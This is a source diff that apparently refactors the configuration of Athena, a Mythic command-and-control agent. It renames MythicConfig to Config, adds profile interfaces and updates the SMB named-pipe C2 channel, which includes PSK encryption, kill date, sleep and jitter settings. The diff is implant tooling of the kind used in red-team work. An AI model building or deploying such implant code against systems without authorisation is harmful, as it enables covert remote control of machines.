@@ -1,4 +1,4 @@
-using Athena.Models.Mythic.Response;
+﻿using Athena.Models.Mythic.Response;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
@@ -9,19 +9,21 @@ using H.Pipes;
 using H.Pipes.Args;
 using System.Threading;
 using System.Collections.Generic;
+using Athena.Models;
+using Athena.Models.Config;
 
 namespace Athena
 {
-    public class MythicConfig
+    public class Config : IConfig
     {
-        public Smb currentConfig { get; set; }
+        public IProfile currentConfig { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder { get; set; }
+        //public Forwarder forwarder { get; set; }
 
-        public MythicConfig()
+        public Config()
         {
             uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
@@ -31,11 +33,11 @@ namespace Athena
             int jitter = 0;
             this.jitter = jitter;
             this.currentConfig = new Smb();
-            this.forwarder = new Forwarder();
+            //this.forwarder = new Forwarder();
         }
     }
 
-    public class Smb
+    public class Smb : IProfile
     {
         public string psk { get; set; }
         private PipeServer<DelegateMessage> serverPipe { get; set; }
@@ -56,7 +58,7 @@ namespace Athena
             this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
+                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
@@ -137,7 +139,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Config.uuid + json);
                 }
 
                 DelegateMessage dm;
@@ -150,7 +152,7 @@ namespace Athena
                     {
                         dm = new DelegateMessage()
                         {
-                            uuid = MythicConfig.uuid,
+                            uuid = Config.uuid,
                             message = part,
                             c2_profile = "smb",
                             final = true
@@ -160,7 +162,7 @@ namespace Athena
                     {
                         dm = new DelegateMessage()
                         {
-                            uuid = MythicConfig.uuid,
+                            uuid = Config.uuid,
                             message = part,
                             c2_profile = "smb",
                             final = false
